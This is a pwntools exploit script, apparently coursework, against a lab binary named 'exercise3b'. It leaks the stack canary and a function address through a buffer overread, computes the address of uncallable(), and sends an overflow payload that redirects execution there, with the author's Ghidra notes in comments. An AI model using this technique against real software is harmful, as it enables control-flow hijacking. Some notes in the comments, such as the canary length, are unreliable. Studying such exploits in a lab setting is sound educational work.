#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise3/exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
Ideas:
- Offset between functions remains constant => ELF() => static offset for uncallable() and static offset for the known function
- How can I get the runtime base address? Ghidra? The address of the function that we can know? I believe I can print it leveraging some vulnerability like bufffer overflow
- Is there still the canary defense? see Ghidra
- Then I guess I can construct the payload
 
Workflow:
- Insights from Ghidra:
	- yes there is the canary again
	- there is a new function print_hello() => potentially the known function
	- there is a buffer of 96 bytes 
	- before the canary check there are 6 variables: 3 of them of length 8 (1 related ro print_hello) and the rest 4 bytes => total of 36 padding to add
- Using python3 exploit3b.py DEBUG GDB I noticed the following in 5 different runs:
	- cb 1c 6f 57 88 b2 e1 1f d0 55
	- 97 60 24 41 88 12 2d 96 e0 55
	- 8c d0 20 b3 88 62 81 49 53 56
	- 12 d2 9b c7 88 92 a4 c5 9a 55
	- b1 5f e3 c3 88 22 42 51 1f 56
	BUT how long is the canary? From Ghidra: it is 4 bytes again => first 4 bytes canary + the uncallable() runtime base address we want to add to the static uncallable() offset
''' 

elf = ELF('handout/exercise3/exercise3b')
uncallable_static_offset = elf.symbols['uncallable']
print_hello_static_offset = elf.symbols['print_hello']

r = start()
r.recvline()
r.sendline(b'A'*95)
r.recvuntil(b'course ')
response = r.recvuntil(b'password\n')

canary_values = response[96:-21][:4]
uncallable_runtime_address = response[96:-21][4:]

uncallable_address = uncallable_static_offset + (int.from_bytes(uncallable_runtime_address,'little') - print_hello_static_offset)

payload = b'A'*96 + canary_values + b'A'*36 + p64(uncallable_address)

r.recvuntil(b'\n')
r.sendline(payload)

print(r.recvall())
